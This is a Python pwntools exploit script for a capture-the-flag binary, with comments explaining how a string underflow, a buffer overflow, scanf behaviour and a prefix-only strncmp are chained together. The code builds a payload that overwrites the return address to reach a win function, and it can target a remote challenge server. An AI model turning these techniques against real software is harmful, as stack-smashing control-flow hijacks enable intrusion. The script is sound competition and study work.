from pwn import *

e = context.binary = ELF('./artifact-11')

'''
Vulnerabilities:

(1) String underflow --
Consider input = ' '              input
                                  v
(Ask for string input)   ?? ?? ?? 32 00 ?? ??
(Change first character) ?? ?? ?? 00 00 ?? ??
(Change last character)  ?? ?? ## 00 00 ?? ?? (strlen(input) == 0)
where ## = ?? - 16

(2) Buffer overflow --
`buf` is a linear array of 33 characters (32 max writable + 1 null byte).
At max saturation:
                [0]                  [1]                  [2]
(Saturate [0])  41 41 41 .. 41 41 00 00 00 00 .. 00 00 00 00
(Underflow [1]) 41 41 41 .. 41 41 F0 00 00 00 .. 00 00 00 00
(Saturate [1])  41 41 41 .. 41 41 F0 42 42 42 .. 42 42 00 00
[Can be further extended as required.]
As such, strlen(&buf[0]) is NOT <= 32, a core assumption in many functions, including `correct`.
`flag` is a fixed size stack buffer whose length of the write depends on strlen **bearing above assumption**.

(3) Scanf shenanigans --
Normally, the scanf statement forces a null byte at the end of the string, breaking the saturation chain.
However, this does not occur on invalid input (e.g. <Enter>), thus allowing us to reuse a particular index
(e.g. to pass to `correct`) without breaking the chain.

(4) Strncmp --
The checked string only needs to *start* with `i love greycademy! <3`, facilitating the overflow chain above.
'''

'''
Payload transform
Due to challenge design, the payload needs to satisfy certain criteria:

(1) To get to `correct`, the payload (saturation chain described above) must start with `i love greycademy! <3` as mentioned in (4) above.

(2) Transformations accumulated from the process of building the chain. Using example above:
                [0]                  [1]                  [2]
(Saturate [0])  41 41 41 .. 41 41 00 00 00 00 .. 00 00 00 00
(Transformed)   21 41 41 .. 41 31 00 00 00 00 .. 00 00 00 00
(Underflow [1]) 21 41 41 .. 41 31 F0 00 00 00 .. 00 00 00 00
(Saturate [1])  21 41 41 .. 41 31 F0 42 42 42 .. 42 42 00 00
(Transformed)   21 41 41 .. 41 31 F0 22 42 42 .. 42 32 00 00
(Invoke [0])    01 41 41 .. 41 31 F0 22 42 42 .. 42 22 00 00
                ^^             ^^    ^^             ^^
- Bytes before F0 gets shifted -0x10
- Bytes after F0 gets shifted -0x20
- Head and tail get shifted -0x40 and -0x20 respectively
But these are easily accountable during payload crafting.

Within `correct` there is still one more transformation pass before producing the payload:
(input) [00] [01] [02] [03] [04]
          ├───┘├───┘├───┘├───┘   (xor)
        [00] [01] [02] [03] [04]
          │    │    │    │    │
(KEY)   ──┐────┐────┐────┐────┐  (xor)
(flag)  [00] [01] [02] [03] [04]       <- final payload
Note that KEY is deterministic (`srand(67)` + "generally" libc independent). Easiest way is to extract it dynamically (below; KEY_A: from `rand()`, KEY_B: from actual `KEY` with overflow).
'''

KEY_A = [0x8f, 0x5b, 0x2f, 0x9f, 0x95, 0x32, 0x9f, 4, 0x15, 1, 0xef, 0x9f, 0x7f, 0xf, 0xec, 0xde, 0x9d, 0xd9, 0xc6, 0xc3, 0x21, 0x94, 0xb0, 0xb0, 0x91, 0xe2, 0x64, 0x6a, 0x78, 0xe0, 0xa5, 8, 0x3b, 0xd5, 0xa7, 0xd0, 7, 0x47, 0xd4, 0x1c, 0x48, 0xc3, 0xbb, 0xc7, 0xd2, 0xa7, 0xa6, 0x6f, 0x81, 0x6c, 0x32, 0xa2, 0, 0xe2, 0x52, 0x91, 0xc4, 0xb7, 0xfc, 0x3d, 0x97, 0xa1, 0x45, 0xd2, 0x76, 0xec, 0xa2, 0x7d, 0x33, 0x76, 0x99, 0x7b, 0x39, 0x54, 0x43, 0xb, 0xfc, 0xe9, 0x7a, 0x7d, 0x55, 0xac, 0x1f, 0x55, 0x8f, 0x71, 0xe6, 0x53, 0x28, 0xe2, 0x90, 0xbf, 0x84, 0xd5, 0x91, 0xfa, 0xc2]
KEY_B = [
    0x25aa14fdff496581, 0x95903f25f9c67661,
    0x0000006fa2e9a8f5, 0x696d616620776f48,
    0x657261207261696c, 0x74697720756f7920,
    0x6e69646165722068, 0x65646f6320432067,
    0x616873206557003f, 0x20646e6966206c6c,
    0x00002e2e2e74756f, 0x70697420656d6f53,
    0x74276e6f44203a73, 0x69207972726f7720,
    0x6f6420756f792066, 0x65646e752074276e,
]
KEY_B = b''.join(map(p64, KEY_B))
KEY = [x^y for x, y in zip(KEY_A, KEY_B)]

seed = b'I love greycademy! <3\0'
res = b''
for i in range(len(seed)-1):
    res += bytes([
        seed[i] ^ seed[i+1] ^ KEY[i]
    ])
assert res == b'grey{cr4ck3d_1t_0p3n}' # sanity check

'''
General derivation process:
- Pre-transformation input has certain fixed bytes (e.g. 0xF0 and `i love greycademy! <3`)
- Post-transformation payload has certain fixed bytes (elaborated below)
- For each required byte post-transformation, abuse the two bytes of freedom used in deriving that byte to find a suitable input byte.
- Remember to undo the -0x10 -0x20 etc transformation

(Pwn) Stack structure:
-0x50 <buffer>
-0x20 input sz      (qword)
-0x18 <???>         (dword)
-0x14 iteration idx (dword)
-0x10 <???>         (oword)
 0x00 <saved rbp>   (qword)
+0x08 ret address   (qword)

Fields in <...> are irrelevant i.e. can be any byte (except first few bytes of buffer I guess).
To directly overcome movaps issue, the return address can be win()+5
'''

START = b'I love greycademy! <3'
WIN = 0x40188e

# pre-transformation
A_FIXED = [None]*0x70
A_FIXED[:len(START)] = list(START)
for i in range(32, 0x70, 33):
    A_FIXED[i] = 0xf0

# post-transformation
B_FIXED = [None]*0x70
B_FIXED[0x30:0x38] = list(p64(0x70))      # preserve input sz
B_FIXED[0x3c:0x40] = list(p32(0x50-0x14)) # preserve iteration idx
B_FIXED[0x58:0x60] = list(p64(WIN))       # hijack ret address

filler = 67

# `correct` transformation back-derivation
for i, b in enumerate(B_FIXED):
    if b is None: continue
    if A_FIXED[i] is None:
        A_FIXED[i] = filler
    assert A_FIXED[i+1] is None, (i+1, A_FIXED[i+1])
    A_FIXED[i+1] = b ^ A_FIXED[i] ^ KEY[i]
assert 0 not in A_FIXED
assert 10 not in A_FIXED

A_FIXED = [x if x is not None else filler for x in A_FIXED]

# misc transformation adjustments
for i in range(31, 0x70, 33):
    A_FIXED[i] = (A_FIXED[i] + 0x10) & 0xff
for i in range(33, 0x70, 33):
    A_FIXED[i] = (A_FIXED[i] + 0x20) & 0xff
A_FIXED[0] = (A_FIXED[0] + 0x40) & 0xff
assert 0 not in A_FIXED
assert 10 not in A_FIXED

# break byte array into 32-byte saturation strings
l, r = 0, 32
res = []
while l < len(A_FIXED):
    res.append(bytes(A_FIXED[l:r]))
    l += 33
    r += 33

p = process() if not args.REMOTE else remote('challs.nusgreyhats.org', 31167)
if args.GDB:
    # gdb.attach(p, 'b *correct+160') # KEY_A
    # gdb.attach(p, 'b *correct+191') # store
    # gdb.attach(p, 'b *correct+272') # ret
    pause()

for i, x in enumerate(res):
    if i:
        # underflow i
        p.sendline(str(i).encode())
        p.sendline(b' ')
    # saturate i
    p.sendline(str(i).encode())
    p.sendline(x)

# invoke 0
p.sendline(b'0')
p.sendline()
p.interactive()
